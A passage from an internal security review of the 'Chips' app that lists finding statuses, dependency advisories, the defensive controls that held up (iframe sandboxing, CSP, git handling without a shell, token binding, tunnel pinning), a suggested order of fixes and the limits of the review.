| SEC-29 | Fixed 26 October: Expo sends only with the server's token. SEC-28, SEC-33 (free names, which fed SEC-49) and SEC-36, its natives and its signature, are fixed too: see above. |
| SEC-30 | The beacon half stands, as ADR 0068 chose. |
| ADR 0191 | The four-line signature inside a tunnel was tolerated "this release"; it is still tolerated. |
| Android | `react-native-webview` still grants a page the camera and microphone when the app holds them. |

Dependencies: `pnpm audit` now reports 36 advisories (1 critical, 9 high, 19 moderate, 7 low), up
from 12 after SEC-18. The two in code that ships are `markdown-it` (SEC-44) and `zod` (SEC-45).
The critical is still `shell-quote` in React Native's dev tooling. The rest sit in Vite and Vitest
(dev servers), the docs site (Astro), and Expo's CLI.

## What held up

**The page door.** On the web the frame has `allow-scripts allow-popups
allow-popups-to-escape-sandbox` and no `allow-same-origin`, and the door's own CSP carries the same
`sandbox`, so a page has an opaque origin whether it is framed or opened as a top-level document. It
cannot reach IndexedDB, localStorage or the device key. Tickets are 256 bits, single use, 30
seconds, bound to one attachment and one principal, and re-checked when spent. Every refusal path
answers JSON. Project pages are built only from `git cat-file` of the bare repository, every
esbuild resolve stays in the project, and they get the same header policy.

**The project's git.** Always `execFile` or `spawn`, never a shell. Room ids are checked before any
path is built, commits are 40-hex, and paths refuse `..` and a leading `/`. The server's git reads
no system or global config and inits with no template hooks; a push cannot write repo config,
delete a branch or rewrite one, and `fsckObjects` is on. A push is held to the project's remaining room by
`receive.maxInputSize`, behind the SEC-11 cap, and the credential is checked before the body is
read. Project tokens are HMACs bound to room, device and ten minutes, compared in constant time,
never in a URL. A harness is admitted only as one of its own agents in the room.

**The door's new events.** `agent.lock_set`, `workspace.renamed`, `relay.set` and `project.changed`
are all `sender: "chips"` and refused from any client. Only owner- or keeper-gated use cases append
them. Replies refuse another room's message at the door and again when building context, so no
quoted text crosses rooms. Corrections go only on an agent's message in its own room and only to
the authoring harness. Pushes go only to people in the room now, minus anyone who hid it. The
member's narrowed directory agrees between the live check and the SQL twin.

**The way to the server.** Go direct and Only direct dial a Noise tunnel to the pinned key and
never fall back to plain HTTP. "Local" in `arrived-at.ts` needs a loopback socket, a loopback host
and no forwarding headers, and it only picks a URL's base. Only an owner pairs a phone for somebody
else, checked again at redeem. The relay pages inline no server data, set a hash-based CSP,
`frame-ancestors 'none'` and `no-referrer`, and never put a code in a path or a log.

**Run and Open folder on the honest server.** `folder.open` and `folder.run` go only to the asking
person's own sockets. The server opens Chips for Mac only for an owner, only on macOS outside dev
mode, with an argument array. The run's child gets no `CHIPS_FOLDER_*` secrets. Printed addresses
are opened only on this Mac's own hosts. The zip is `git archive` of tracked files, sized before it
is made.

**Bridges.** The package comes only from the card Chips ships, never from a link or the server. The
tarball is checked, unpacked with `tar` and run by its one bin; no npm, no lifecycle scripts, no
`.npmrc`. Plists are XML-escaped and written 0600, and the harness key is kept through
`security -i` on stdin.

## Suggested order

1. SEC-39 today, by Arjun's rule: Run and Open only on the Mac where the server runs, told by
   key, and only for an owner. Then a build of Chips for Mac, the web bundle and the phone.
2. SEC-41: two `try`s and a process handler, then a relay redeploy.
3. SEC-40: refuse a guest's push (one clause plus the two-role rule in `undoRefused`), then Run
   comparing the commit.
4. SEC-42: Arjun's choice between trusting the relay operator and confirming a link-paired device.
5. SEC-43, SEC-44 and SEC-45: the ring buffer and two bumps.
6. The Lows, and CI back on (SEC-19), since nothing since 10 October has run through it. (Arjun
   left CI off, 26 October: the checks run on the Mac.)

## What this review did not do

It did not probe the live server on 4431 or the hosted relay; the relay crash was reproduced on a
relay started from source on 127.0.0.1. It did not check whether Caddy passes `//` to the relay.
SEC-47 was not tried on a device. SEC-43 was measured on a local tunnel, not under the relay's real
traffic, and SEC-45 and SEC-53 were not load-tested. The bridges in their own repositories, the
Jacobian adapter and the hosted relay's host configuration were not read.
